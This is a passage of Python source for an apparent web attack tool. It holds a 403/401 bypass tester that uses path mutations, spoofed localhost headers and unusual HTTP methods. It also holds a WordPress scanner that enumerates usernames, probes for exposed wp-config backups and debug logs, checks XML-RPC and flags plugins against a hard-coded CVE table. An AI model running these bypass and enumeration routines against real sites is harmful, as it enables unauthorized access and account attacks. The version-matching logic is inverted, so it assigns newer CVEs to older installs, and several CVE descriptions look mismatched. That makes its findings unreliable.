                r = engine.sess.get(f"{self.base}{variant}", timeout=6,
                                    verify=False, allow_redirects=True)
                if r.status_code==200:
                    self.found.append({"url":f"{self.base}{variant}","method":"GET",
                                       "label":f"path-mutation:{label}","status":200})
                    return
            except: pass

    def run(self) -> list:
        sep("403 / 401 BYPASS TESTER")
        self.logger.section("BYPASS TESTER")
        target = f"{self.base}{self.path}"
        print(f"  Target: {C.CY}{target}{C.E}\n")

        # A – Path manipulation (WAF-evading)
        print(f"  {C.Y}[A] Path Manipulation{C.E}")
        for variant, label in self._mutator.variants(self.path):
            self._try(label, "GET", f"{self.base}{variant}")

        # B – Header bypass
        print(f"\n  {C.Y}[B] Header Bypass{C.E}")
        header_sets = [
            ({"X-Forwarded-For":"127.0.0.1"},                  "X-Forwarded-For: 127.0.0.1"),
            ({"X-Forwarded-For":"localhost"},                   "X-Forwarded-For: localhost"),
            ({"X-Real-IP":"127.0.0.1"},                        "X-Real-IP: 127.0.0.1"),
            ({"X-Custom-IP-Authorization":"127.0.0.1"},        "X-Custom-IP-Auth"),
            ({"X-Originating-IP":"127.0.0.1"},                 "X-Originating-IP"),
            ({"X-Remote-IP":"127.0.0.1","X-Remote-Addr":"127.0.0.1"}, "X-Remote-*"),
            ({"CF-Connecting-IP":"127.0.0.1"},                 "CF-Connecting-IP"),
            ({"True-Client-IP":"127.0.0.1"},                   "True-Client-IP"),
            ({"Fastly-Client-IP":"127.0.0.1"},                 "Fastly-Client-IP"),
            ({"X-Forwarded-Host":"localhost"},                  "X-Forwarded-Host: localhost"),
            ({"X-Original-URL": self.path},                    "X-Original-URL"),
            ({"X-Rewrite-URL": self.path},                     "X-Rewrite-URL"),
            ({"X-Override-URL": self.path},                    "X-Override-URL"),
            ({"Referer": f"{self.base}{self.path}"},           "Referer self"),
            ({"X-Host":"127.0.0.1","Origin":"https://localhost"}, "X-Host+Origin"),
            ({"X-Forwarded-Proto":"http"},                     "X-Forwarded-Proto: http"),
            ({"X-Forwarded-Proto":"https"},                    "X-Forwarded-Proto: https"),
            ({"Forwarded":"for=127.0.0.1"},                    "Forwarded: for=127.0.0.1"),
            ({"X-Client-IP":"127.0.0.1"},                      "X-Client-IP"),
            ({"X-Client-IP":"::1"},                            "X-Client-IP: ::1"),
            ({"X-ProxyUser-IP":"127.0.0.1"},                   "X-ProxyUser-IP"),
            ({"X-Original-Remote-Addr":"127.0.0.1"},           "X-Original-Remote-Addr"),
            ({"X-Original-IP":"127.0.0.1"},                    "X-Original-IP"),
            ({"X-Forwarded-For":"127.0.0.1, 127.0.0.1"},       "X-Forwarded-For (double)"),
            ({"X-Forwarded-For":"127.0.0.1, 127.0.0.1, 127.0.0.1"}, "X-Forwarded-For (triple)"),
            ({"X-Forwarded-For":"127.0.0.1","X-Forwarded-For":"127.0.0.1"}, "X-Forwarded-For (duplicate)"),
            ({"X-Real-IP":"127.0.0.1","X-Forwarded-For":"127.0.0.1"}, "X-Real-IP + XFF"),
            ({"X-Forwarded-Host":"127.0.0.1","X-Forwarded-For":"127.0.0.1"}, "XFH + XFF"),
        ]
        for h, label in header_sets:
            self._try(label, "GET", target, headers=h)

        # C – HTTP Methods
        print(f"\n  {C.Y}[C] HTTP Method Bypass{C.E}")
        for method in ["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD",
                       "TRACE","CONNECT","PROPFIND","PROPPATCH","MKCOL",
                       "COPY","MOVE","LOCK","UNLOCK"]:
            self._try(f"Method: {method}", method, target)

        print(f"\n  {C.G}[✔] Bypass Test Done: {len(self.found)} successful{C.E}")
        self.logger.save("bypass_results", self.found)
        return self.found



# ══════════════════════════════
#  MODULE 8 – WORDPRESS VULNERABILITY SCANNER
# ══════════════════════════════
# آسیب‌پذیری‌های شناخته‌شده وردپرس به تفکیک نسخه
WP_VERSION_VULNS: Dict[str, List[dict]] = {
    # ── Universal issues (all versions) ───────────────────────────────
    "ALL": [
        {"id": "WP-001", "type": "Username Enumeration", "severity": "Medium",
         "desc": "Author enumeration via /?author=N — reveals login usernames",
         "check_url": "/?author=1", "check_method": "redirect_slug"},
        {"id": "WP-002", "type": "Username Enumeration", "severity": "Medium",
         "desc": "REST API user listing via /wp-json/wp/v2/users (unauthenticated)",
         "check_url": "/wp-json/wp/v2/users", "check_method": "json_users"},
        {"id": "WP-003", "type": "Username Enumeration", "severity": "Medium",
         "desc": "REST route enumeration via /?rest_route=/wp/v2/users",
         "check_url": "/?rest_route=/wp/v2/users", "check_method": "json_users"},
        {"id": "WP-004", "type": "Version Disclosure", "severity": "Low",
         "desc": "WordPress version exposed in /readme.html",
         "check_url": "/readme.html", "check_method": "200_ok"},
        {"id": "WP-005", "type": "Version Disclosure", "severity": "Low",
         "desc": "WordPress version visible in RSS feed <generator> tag",
         "check_url": "/?feed=rss2", "check_method": "200_ok"},
        {"id": "WP-006", "type": "Attack Surface", "severity": "High",
         "desc": "XML-RPC enabled — allows brute-force amplification (1000x), SSRF, pingback attacks",
         "check_url": "/xmlrpc.php", "check_method": "xmlrpc"},
        {"id": "WP-007", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress debug log publicly accessible",
         "check_url": "/wp-content/debug.log", "check_method": "200_ok"},
        {"id": "WP-008", "type": "Config Exposure", "severity": "Critical",
         "desc": "wp-config.php backup/old version exposed",
         "check_url": "/wp-config.php.bak", "check_method": "200_ok"},
        {"id": "WP-009", "type": "Config Exposure", "severity": "Critical",
         "desc": "wp-config.php.old version exposed",
         "check_url": "/wp-config.php.old", "check_method": "200_ok"},
        {"id": "WP-010", "type": "Config Exposure", "severity": "Critical",
         "desc": "wp-config.php~ swap file exposed",
         "check_url": "/wp-config.php~", "check_method": "200_ok"},
        {"id": "WP-011", "type": "Attack Surface", "severity": "Medium",
         "desc": "wp-admin login page exposed (brute-force possible)",
         "check_url": "/wp-login.php", "check_method": "200_or_200"},
        {"id": "WP-012", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress REST API index publicly exposed — reveals routes & namespaces",
         "check_url": "/wp-json/", "check_method": "200_ok"},
    ],
    # ── Version-specific CVEs ─────────────────────────────────────────
    "6.4": [
        {"id": "CVE-2024-4439", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress 6.4.0-6.4.3 — Stored XSS via HTML API in Avatar block (Contributor+)"},
        {"id": "CVE-2024-31210", "type": "RCE", "severity": "Critical",
         "desc": "WordPress 6.4.0-6.4.2 — PHP Object Injection via Customizer (Admin+)"},
    ],
    "6.3": [
        {"id": "CVE-2023-5692", "type": "Open Redirect", "severity": "Medium",
         "desc": "WordPress < 6.3.2 — Open Redirect in redirect_guess_404_permalink()"},
        {"id": "CVE-2023-38000", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress 6.3.0-6.3.1 — Stored XSS via Footnotes block (Contributor+)"},
    ],
    "6.2": [
        {"id": "CVE-2023-2745", "type": "Path Traversal", "severity": "Medium",
         "desc": "WordPress < 6.2.1 — Contributor+ Directory Traversal via Theme file loading"},
    ],
    "6.1": [
        {"id": "CVE-2023-0553", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 6.1.2 — Stored XSS in post link block (Contributor+)"},
        {"id": "CVE-2023-0234", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 6.1.2 — Stored XSS via comment author URL"},
    ],
    "6.0": [
        {"id": "CVE-2022-43504", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress < 6.0.3 — Private post info leakage via oEmbed and trackbacks"},
        {"id": "CVE-2022-43497", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 6.0.3 — Stored XSS in Widgets block (Author+)"},
        {"id": "CVE-2022-43500", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 6.0.3 — Stored XSS in Featured Image block (Author+)"},
    ],
    "5.9": [
        {"id": "CVE-2022-3590", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress < 6.0.2 — Username exposure via crafted login error message"},
    ],
    "5.8": [
        {"id": "CVE-2021-39200", "type": "Info Disclosure", "severity": "Low",
         "desc": "WordPress < 5.8.1 — REST API data exposure in /wp/v2 endpoint"},
        {"id": "CVE-2021-39201", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.8.1 — Stored XSS via post captions (Author+)"},
    ],
    "5.7": [
        {"id": "CVE-2021-29450", "type": "XXE", "severity": "High",
         "desc": "WordPress 3.7–5.7 — Authenticated XXE in Media Library (Author+)"},
        {"id": "CVE-2021-29447", "type": "XXE + SSRF", "severity": "Critical",
         "desc": "WordPress < 5.7.1 — Unauthenticated XXE via crafted WAV file → SSRF/file read"},
    ],
    "5.6": [
        {"id": "CVE-2021-29476", "type": "XXE", "severity": "High",
         "desc": "WordPress 5.6 — XXE injection in Media Library WAV upload (Author+)"},
    ],
    "5.5": [
        {"id": "CVE-2020-28032", "type": "Object Injection", "severity": "Critical",
         "desc": "WordPress < 5.5.2 — PHP Object Injection via Widgets import (Admin+)"},
        {"id": "CVE-2020-28033", "type": "Open Redirect", "severity": "Medium",
         "desc": "WordPress < 5.5.2 — Open Redirect via logout redirect URL"},
        {"id": "CVE-2020-28034", "type": "Stored XSS", "severity": "High",
         "desc": "WordPress < 5.5.2 — Stored XSS via post slugs (Author+)"},
        {"id": "CVE-2020-28035", "type": "Privilege Escalation", "severity": "High",
         "desc": "WordPress < 5.5.2 — XML-RPC grants privileged access to subscribers"},
        {"id": "CVE-2020-28036", "type": "CSRF", "severity": "High",
         "desc": "WordPress < 5.5.2 — CSRF in wp-admin comment approval"},
        {"id": "CVE-2020-28037", "type": "Improper Access Control", "severity": "Medium",
         "desc": "WordPress < 5.5.2 — Denial of Service via crafted shortcode"},
    ],
    "5.4": [
        {"id": "CVE-2020-25286", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.4.2 — Stored XSS via block type attributes (Contributor+)"},
        {"id": "CVE-2020-25284", "type": "Privilege Escalation", "severity": "Medium",
         "desc": "WordPress < 5.4.2 — Avatar upload bypass (Subscriber+)"},
    ],
    "5.3": [
        {"id": "CVE-2020-11025", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.4 — Stored XSS via Customizer (Author+)"},
        {"id": "CVE-2020-11026", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.4 — Stored XSS in widget titles (Author+)"},
        {"id": "CVE-2020-11028", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress < 5.4 — Private post comments exposed to unauthenticated users"},
        {"id": "CVE-2020-11027", "type": "Privilege Escalation", "severity": "Medium",
         "desc": "WordPress < 5.4 — Privilege escalation via password reset link (time-based)"},
    ],
    "5.2": [
        {"id": "CVE-2019-17671", "type": "Auth Bypass", "severity": "Medium",
         "desc": "WordPress < 5.2.4 — Unauthenticated viewing of private/draft posts"},
        {"id": "CVE-2019-17675", "type": "CSRF", "severity": "Medium",
         "desc": "WordPress < 5.2.4 — CSRF in Customizer (authenticated)"},
        {"id": "CVE-2019-17672", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.2.4 — Stored XSS via wptexturize() function"},
        {"id": "CVE-2019-17674", "type": "Open Redirect", "severity": "Low",
         "desc": "WordPress < 5.2.4 — Open Redirect in wp-admin media upload"},
        {"id": "CVE-2019-17673", "type": "Spam / DoS", "severity": "Low",
         "desc": "WordPress < 5.2.4 — Unfiltered comment author URL injection"},
    ],
    "5.1": [
        {"id": "CVE-2019-9787", "type": "CSRF + RCE", "severity": "Critical",
         "desc": "WordPress < 5.1.1 — CSRF via comment validation → Remote Code Execution"},
    ],
    "5.0": [
        {"id": "CVE-2019-8942", "type": "Path Traversal + RCE", "severity": "Critical",
         "desc": "WordPress < 5.0.1 — Crop-image Shell Upload (Author+) → RCE"},
        {"id": "CVE-2019-8943", "type": "Path Traversal", "severity": "High",
         "desc": "WordPress < 5.0.1 — Path Traversal in post meta (Author+)"},
        {"id": "CVE-2018-20150", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.0.1 — Stored XSS via theme name"},
        {"id": "CVE-2018-20151", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress < 5.0.1 — User activation key exposure in crafted request"},
        {"id": "CVE-2018-20152", "type": "Open Redirect", "severity": "Low",
         "desc": "WordPress < 5.0.1 — Open Redirect via media admin URL"},
        {"id": "CVE-2018-20153", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 5.0.1 — Stored XSS via crafted author name"},
    ],
    "4.9": [
        {"id": "CVE-2018-5776", "type": "XSS", "severity": "Medium",
         "desc": "WordPress < 4.9.1 — XSS in plugin/theme uploads (Admin+)"},
    ],
    "4.8": [
        {"id": "CVE-2017-9066", "type": "SSRF", "severity": "High",
         "desc": "WordPress < 4.8 — SSRF via crafted HTTP request in HTTP API"},
    ],
    "4.7": [
        {"id": "CVE-2017-1001000", "type": "Privilege Escalation", "severity": "Critical",
         "desc": "WordPress 4.7.0-4.7.1 — REST API unauthenticated content injection (edit any post)"},
        {"id": "CVE-2017-5611", "type": "SQL Injection", "severity": "Critical",
         "desc": "WordPress < 4.7.2 — SQL Injection in WP_Query (unauthenticated)"},
        {"id": "CVE-2017-5610", "type": "Info Disclosure", "severity": "Medium",
         "desc": "WordPress < 4.7.2 — Press This CSRF / DoS"},
        {"id": "CVE-2017-5612", "type": "XSS", "severity": "Medium",
         "desc": "WordPress < 4.7.2 — Reflected XSS in term/post author dropdown"},
    ],
    "4.6": [
        {"id": "CVE-2016-10033", "type": "RCE", "severity": "Critical",
         "desc": "WordPress 4.6 — PHPMailer RCE via crafted email From header (unauthenticated)"},
    ],
    "4.3": [
        {"id": "CVE-2015-5714", "type": "Stored XSS", "severity": "Medium",
         "desc": "WordPress < 4.3.1 — Stored XSS via custom posts and shortcode tags"},
        {"id": "CVE-2015-5715", "type": "Privilege Escalation", "severity": "Medium",
         "desc": "WordPress < 4.3.1 — Contributor+ publish/viewing private post"},
    ],
    "4.2": [
        {"id": "CVE-2015-3440", "type": "Stored XSS", "severity": "High",
         "desc": "WordPress < 4.2.1 — Stored XSS via crafted comment (unauthenticated)"},
    ],
    "4.1": [
        {"id": "CVE-2015-3438", "type": "Stored XSS", "severity": "High",
         "desc": "WordPress < 4.1.2 — Multiple Stored XSS in comments"},
    ],
    "3.9": [
        {"id": "CVE-2014-5205", "type": "CSRF", "severity": "Medium",
         "desc": "WordPress < 3.9.2 — CSRF in user metadata update"},
    ],
}


class WordPressScanner:
    """WordPress-specific vulnerability and information scanner.
    
    Modules:
      1. Version detection (readme.html, meta generator, RSS feed)
      2. Username enumeration (/?author=N, REST API, REST route)
      3. XML-RPC attack surface check
      4. Universal security checks (debug log, config backup, etc.)
      5. Version-specific CVE database lookup
    """

    def __init__(self, url: str, engine: Engine, logger: Logger):
        self.url     = url.rstrip('/')
        self.engine  = engine
        self.logger  = logger
        self.version : Optional[str] = None
        self.users   : List[str] = []
        self.findings: List[dict] = []
        self._lk     = threading.Lock()

    # ── Version Detection ──────────────────────────────────────────────
    def detect_version(self) -> Optional[str]:
        """Detect WordPress version from multiple passive sources."""
        version = None

        # Source 1: /readme.html (most reliable)
        r = self.engine.get(f"{self.url}/readme.html")
        if r and r.status_code == 200:
            m = re.search(r'[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)', r.text)
            if m:
                version = m.group(1)
                print(f"  {C.G}[VERSION]{C.E} Found in readme.html : {C.CY}{version}{C.E}")

        # Source 2: meta generator on homepage
        if not version:
            r = self.engine.get(self.url)
            if r and r.status_code == 200:
                m = re.search(
                    r'<meta[^>]+name=["\'\']generator["\'\'][^>]+content=["\'\']WordPress\s+([\d.]+)',
                    r.text, re.I)
                if not m:
                    m = re.search(r'content=["\'\']WordPress\s+([\d.]+)["\'\']', r.text, re.I)
                if m:
                    version = m.group(1)
                    print(f"  {C.G}[VERSION]{C.E} Found in meta generator : {C.CY}{version}{C.E}")

        # Source 3: RSS feed <generator> tag
        if not version:
            r = self.engine.get(f"{self.url}/?feed=rss2")
            if r and r.status_code == 200:
                m = re.search(r'<generator>https?://wordpress\.org/\?v=([\d.]+)</generator>', r.text)
                if m:
                    version = m.group(1)
                    print(f"  {C.G}[VERSION]{C.E} Found in RSS feed : {C.CY}{version}{C.E}")

        # Source 4: Atom feed
        if not version:
            r = self.engine.get(f"{self.url}/?feed=atom")
            if r and r.status_code == 200:
                m = re.search(r'<generator[^>]*>.*?WordPress.*?([\d]+\.[\d]+(?:\.[\d]+)?)', r.text, re.I | re.S)
                if m:
                    version = m.group(1)
                    print(f"  {C.G}[VERSION]{C.E} Found in Atom feed : {C.CY}{version}{C.E}")

        # Source 5: Link header / script version query string
        if not version:
            r = self.engine.get(self.url)
            if r and r.status_code == 200:
                m = re.search(r'wp-includes/[^"?\'\'>]+\?ver=([\d.]+)', r.text)
                if m:
                    version = m.group(1)
                    print(f"  {C.G}[VERSION]{C.E} Found in asset query string : {C.CY}{version}{C.E}")

        self.version = version
        return version

    # ── Username Enumeration ──────────────────────────────────────────
    def enumerate_users(self) -> List[str]:
        """Enumerate WordPress usernames via multiple methods."""
        users: List[str] = []

        # Method 1: /?author=N — redirect reveals slug (username)
        print(f"  {C.DIM}[M1] Testing /?author=N author enumeration ...{C.E}")
        vulnerable_author = False
        for i in range(1, 11):
            r = self.engine.get(f"{self.url}/?author={i}")
            if not r:
                continue
            # Check redirect location for username
            final_url = r.url
            loc = r.headers.get("Location", "")
            check = final_url + loc
            m = re.search(r'/author/([^/?&#\'\'"]+)', check)
            if m:
                username = unquote(m.group(1))
                if username and username not in users:
                    users.append(username)
                    vulnerable_author = True
                    print(f"  {C.G}[USER ✔]{C.E} /?author={i}  →  slug: {C.CY}{username}{C.E}")
            # Some configs redirect to profile page with login name in title
            elif r.status_code == 200 and "author" in r.url.lower():
                m2 = re.search(r'"author":\s*"([^"]+)"', r.text)
                if m2:
                    username = m2.group(1)
                    if username and username not in users:
                        users.append(username)
                        print(f"  {C.G}[USER ✔]{C.E} /?author={i}  →  name: {C.CY}{username}{C.E}")

        if not vulnerable_author:
            print(f"  {C.DIM}    author=N enumeration appears protected (no slug redirect){C.E}")

        # Method 2: /wp-json/wp/v2/users
        print(f"  {C.DIM}[M2] Testing REST API /wp-json/wp/v2/users ...{C.E}")
        rest_users = self._probe_rest_users(f"{self.url}/wp-json/wp/v2/users")
        for u in rest_users:
            if u not in users:
                users.append(u)

        # Method 3: /?rest_route=/wp/v2/users (fallback for REST)
        if not rest_users:
            print(f"  {C.DIM}[M3] Testing /?rest_route=/wp/v2/users ...{C.E}")
            alt_users = self._probe_rest_users(f"{self.url}/?rest_route=/wp/v2/users")
            for u in alt_users:
                if u not in users:
                    users.append(u)

        # Method 4: Sitemap-based username leak (some setups)
        if not users:
            r = self.engine.get(f"{self.url}/?sitemap=users")
            if r and r.status_code == 200 and "author" in r.text.lower():
                for m in re.finditer(r'/author/([^/<]+)', r.text):
                    username = unquote(m.group(1))
                    if username and username not in users:
                        users.append(username)
                        print(f"  {C.G}[USER ✔]{C.E} Sitemap leak  →  {C.CY}{username}{C.E}")

        self.users = users
        return users

    def _probe_rest_users(self, endpoint: str) -> List[str]:
        """Probe a REST API users endpoint and extract user data."""
        users = []
        r = self.engine.get(endpoint)
        if not r or r.status_code != 200:
            print(f"  {C.DIM}    {endpoint.split('/')[-1]} → {r.status_code if r else 'no response'}{C.E}")
            return users
        try:
            data = r.json()
            if isinstance(data, list) and data:
                print(f"  {C.R}[!] REST API user endpoint OPEN — {len(data)} users exposed!{C.E}")
                for u in data:
                    slug = u.get('slug') or u.get('username', '')
                    name = u.get('name', '')
                    uid  = u.get('id', '?')
                    desc = u.get('description', '')[:60]
                    if slug and slug not in users:
                        users.append(slug)
                        print(f"  {C.G}[USER ✔]{C.E} ID:{uid}  login:{C.CY}{slug}{C.E}  display:{name}")
        except Exception:
            pass
        return users

    # ── XML-RPC Check ──────────────────────────────────────────────────
    def check_xmlrpc(self) -> bool:
        """Check if XML-RPC is enabled and accepting connections."""
        r = self.engine.get(f"{self.url}/xmlrpc.php")
        if not r:
            return False
        if r.status_code == 200:
            if 'xml-rpc' in r.text.lower() or 'xmlrpc' in r.text.lower() or 'xml rpc' in r.text.lower():
                return True
        # Also check with a minimal POST (multicall probe)
        try:
            payload = b"""<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
            resp = self.engine.sess.post(
                f"{self.url}/xmlrpc.php",
                data=payload,
                headers={"Content-Type": "text/xml", "User-Agent": random.choice(Config.UA_LIST)},
                timeout=Config.TIMEOUT, verify=False
            )
            if resp.status_code == 200 and '<methodResponse>' in resp.text:
                return True
        except Exception:
            pass
        return r.status_code == 200

    # ── Universal Security Checks ──────────────────────────────────────
    def run_universal_checks(self):
        """Run all universal checks from WP_VERSION_VULNS["ALL"]."""
        all_checks = WP_VERSION_VULNS.get("ALL", [])
        for check in all_checks:
            cid    = check["id"]
            url    = f"{self.url}{check['check_url']}"
            method = check["check_method"]

            if method == "redirect_slug":
                # Already handled in enumerate_users
                continue
            elif method == "json_users":
                # Already handled in enumerate_users
                continue
            elif method == "xmlrpc":
                enabled = self.check_xmlrpc()
                if enabled:
                    sev_col = C.R
                    print(f"  {sev_col}[{check['severity']}]{C.E} {C.BOLD}{cid}{C.E} {C.Y}{check['type']}{C.E}")
                    print(f"    {C.DIM}{check['desc']}{C.E}")
                    print(f"    {C.G}→ {url}{C.E}")
                    with self._lk:
                        self.findings.append({
                            "id": cid, "type": check["type"],
                            "severity": check["severity"],
                            "url": url, "detail": check["desc"]
                        })
                else:
                    print(f"  {C.G}[OK]{C.E} {cid} — XML-RPC disabled or protected")
            elif method == "200_ok":
                r = self.engine.get(url)
                if r and r.status_code == 200:
                    size = len(r.content)
                    sev_col = (C.R if check["severity"] == "Critical" else
                               C.M if check["severity"] == "High" else
                               C.Y if check["severity"] == "Medium" else C.G)
                    print(f"  {sev_col}[EXPOSED {check['severity']}]{C.E} {C.BOLD}{cid}{C.E} {C.Y}{check['type']}{C.E}")
                    print(f"    {C.DIM}{check['desc']}{C.E}")
                    print(f"    {C.G}→ {url} ({size}b){C.E}")
                    with self._lk:
                        self.findings.append({
                            "id": cid, "type": check["type"],
                            "severity": check["severity"],
                            "url": url, "detail": check["desc"],
                            "size": size
                        })
                else:
                    sc = r.status_code if r else "?"
                    print(f"  {C.G}[OK]{C.E} {cid} → {sc}")
            elif method == "200_or_200":
                r = self.engine.get(url)
                if r and r.status_code == 200:
                    print(f"  {C.Y}[NOTE]{C.E} {cid} — wp-login.php accessible ({url})")

    # ── Version CVE Lookup ─────────────────────────────────────────────
    def check_version_vulns(self) -> List[dict]:
        """Find all known CVEs applicable to the detected version."""
        if not self.version:
            return []

        applicable = []
        parts = self.version.split(".")
        # Compare as floats for major.minor
        try:
            current = float(f"{parts[0]}.{parts[1]}")
        except (ValueError, IndexError):
            return []

        for ver_str, vulns in WP_VERSION_VULNS.items():
            if ver_str == "ALL":
                continue
            try:
                ver_float = float(ver_str)
            except ValueError:
                continue
            # If current version <= version with known vuln, it's affected
            # (vulns are fixed in higher versions; if you run 5.4, you have 5.4 & below vulns)
            if current <= ver_float:
                applicable.extend(vulns)

        # Deduplicate by CVE id
        seen = set()
        deduped = []
        for v in applicable:
            if v["id"] not in seen:
                seen.add(v["id"])
                deduped.append(v)

        return deduped

    # ── Plugin / Theme Fingerprint ─────────────────────────────────────
    def check_common_plugins(self) -> List[str]:
        """Check for presence of high-impact vulnerable plugins."""
        VULN_PLUGINS = [
            # (path, plugin_name, known_risk)
            ("/wp-content/plugins/elementor/", "Elementor", "Multiple XSS/Auth bypass"),
            ("/wp-content/plugins/woocommerce/", "WooCommerce", "Multiple SQLi/Auth issues"),
            ("/wp-content/plugins/contact-form-7/", "Contact Form 7", "Unrestricted file upload"),
            ("/wp-content/plugins/wordfence/", "Wordfence", "Security plugin (info)"),
            ("/wp-content/plugins/akismet/", "Akismet", "Known XSS history"),
            ("/wp-content/plugins/jetpack/", "Jetpack", "Multiple auth issues"),
            ("/wp-content/plugins/yoast-seo/", "Yoast SEO", "Stored XSS history"),
            ("/wp-content/plugins/all-in-one-seo-pack/", "All-in-One SEO", "Privilege escalation"),
            ("/wp-content/plugins/updraftplus/", "UpdraftPlus", "Auth bypass backup download"),
            ("/wp-content/plugins/wpforms-lite/", "WPForms", "SQL injection history"),
            ("/wp-content/plugins/gravityforms/", "Gravity Forms", "File upload / SQLi"),
            ("/wp-content/plugins/duplicator/", "Duplicator", "Unauthenticated backup download"),
            ("/wp-content/plugins/all-in-one-wp-migration/", "All-in-One WP Migration", "Auth bypass backup download"),
            ("/wp-content/plugins/wp-file-manager/", "WP File Manager", "Unauthenticated RCE (CVE-2020-25213)"),
            ("/wp-content/plugins/revslider/", "Revolution Slider", "LFI/Shell upload (very old)"),
            ("/wp-content/plugins/advanced-custom-fields/", "ACF", "Stored XSS history"),
            ("/wp-content/plugins/ninja-forms/", "Ninja Forms", "SQLi/XSS history"),
            ("/wp-content/plugins/mailchimp-for-wp/", "Mailchimp for WP", "XSS history"),
            ("/wp-content/plugins/w3-total-cache/", "W3 Total Cache", "SSRF history"),
            ("/wp-content/plugins/wp-super-cache/", "WP Super Cache", "RCE history"),
        ]
        found_plugins = []
        print(f"  {C.DIM}Checking for common plugins ...{C.E}")
        for path, name, risk in VULN_PLUGINS:
            r = self.engine.get(f"{self.url}{path}")
            if r and r.status_code in (200, 403):
                sc_label = "FOUND" if r.status_code == 200 else "EXISTS(403)"
                print(f"  {C.Y}[PLUGIN {sc_label}]{C.E} {C.CY}{name}{C.E}  {C.DIM}{risk}{C.E}")
                found_plugins.append({"plugin": name, "path": path, "risk": risk, "status": r.status_code})
        return found_plugins

    # ── Main Run ───────────────────────────────────────────────────────
    def run(self) -> dict:
        sep("WORDPRESS VULNERABILITY SCANNER")
        self.logger.section("WORDPRESS SCANNER")
        print(f"  Target : {C.CY}{self.url}{C.E}\n")

        # ── Hard WordPress detection before doing ANYTHING else ──────────
        cprint(C.Y, "  [*] Checking for WordPress signatures ...")
        is_wp = False

        # Check 1: Homepage body signatures
        r = self.engine.get(self.url)
        if r and r.status_code < 400:
            body = r.text.lower()
            if any(sig in body for sig in
                   ["wp-content", "wp-includes", "wp-json", "wp-login",
                    "wordpress", "xmlrpc", "/wp-admin"]):
                is_wp = True

        # Check 2: wp-login.php accessible
        if not is_wp:
            r2 = self.engine.get(f"{self.url}/wp-login.php")
            if r2 and r2.status_code in (200, 301, 302, 403):
                body2 = (r2.text or "").lower()
                if any(s in body2 for s in ["wordpress","wp-login","user_login",
                                             "wp-submit","blogname"]):
                    is_wp = True

        # Check 3: /wp-admin/ redirect (even 403 confirms WP is there)
        if not is_wp:
            r3 = self.engine.get(f"{self.url}/wp-admin/")
            if r3 and r3.status_code in (200, 301, 302, 403):
                if r3.status_code == 403 or "wp-login" in (r3.headers.get("Location","") + r3.text).lower():
                    is_wp = True

        # Check 4: readme.html
        if not is_wp:
            r4 = self.engine.get(f"{self.url}/readme.html")
            if r4 and r4.status_code == 200 and "wordpress" in r4.text.lower():
                is_wp = True

        if not is_wp:
            sep("RESULT")
            cprint(C.R,  "  [✘] Target does NOT appear to be running WordPress.")
            cprint(C.DIM, "  None of the following were found:")
            cprint(C.DIM, "    • wp-content / wp-includes signatures in HTML")
            cprint(C.DIM, "    • /wp-login.php (200/301/302/403)")
            cprint(C.DIM, "    • /wp-admin/ (200/301/302/403)")
            cprint(C.DIM, "    • /readme.html with WordPress mention")
            cprint(C.Y,  "  Hint: Use Info Gathering (option 1) to identify the actual CMS.")
            self.logger.log("[WP_SCANNER] Target is not WordPress — scan aborted.")
            return {"version": None, "users": [], "plugins": [], "findings": []}

        cprint(C.G, "  [✔] WordPress confirmed — proceeding with full scan\n")

        # ── Step 1: Version Detection ──────────────────────────────────
        sep("1. VERSION DETECTION")
        version = self.detect_version()
        if version:
            cprint(C.G, f"\n  [✔] WordPress Version Detected: {version}")
            major_minor = ".".join(version.split(".")[:2])
        else:
            cprint(C.Y, "  [?] Version could not be determined (hardening may be in place)")
            major_minor = None

        # ── Step 2: Universal Security Checks ─────────────────────────
        sep("2. UNIVERSAL SECURITY CHECKS")
        print()
        self.run_universal_checks()

        # ── Step 3: Username Enumeration ──────────────────────────────
        sep("3. USERNAME ENUMERATION")
        print()
        users = self.enumerate_users()
        if users:
            print(f"\n  {C.R}[!] {len(users)} WordPress username(s) enumerated:{C.E}")
            for u in users:
                print(f"    {C.CY}  → {u}{C.E}")
            self.findings.append({
                "id": "WP-ENUM",
                "type": "Username Enumeration",
                "severity": "Medium",
                "url": f"{self.url}/?author=1",
                "detail": f"Exposed usernames: {', '.join(users)}"
            })
        else:
            cprint(C.G, "  [✔] Username enumeration appears protected")

        # ── Step 4: Plugin Fingerprint ─────────────────────────────────
        sep("4. PLUGIN FINGERPRINT")
        print()
        found_plugins = self.check_common_plugins()
        if found_plugins:
            print(f"\n  {C.Y}[!] {len(found_plugins)} known plugin(s) detected{C.E}")
        else:
            cprint(C.G, "  [✔] No common vulnerable plugins detected")

        # ── Step 5: Version-Specific CVEs ─────────────────────────────
        if version:
            sep(f"5. CVE DATABASE — WordPress {version}")
            print()
            version_vulns = self.check_version_vulns()
            if version_vulns:
                sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
                version_vulns.sort(key=lambda v: sev_order.get(v["severity"], 9))
                print(f"  {C.R}[!] {len(version_vulns)} known vulnerability(ies) applicable to WordPress {version}:{C.E}\n")
                for v in version_vulns:
                    sev_col = (C.R if v["severity"] == "Critical" else
                               C.M if v["severity"] == "High" else
                               C.Y if v["severity"] == "Medium" else C.G)
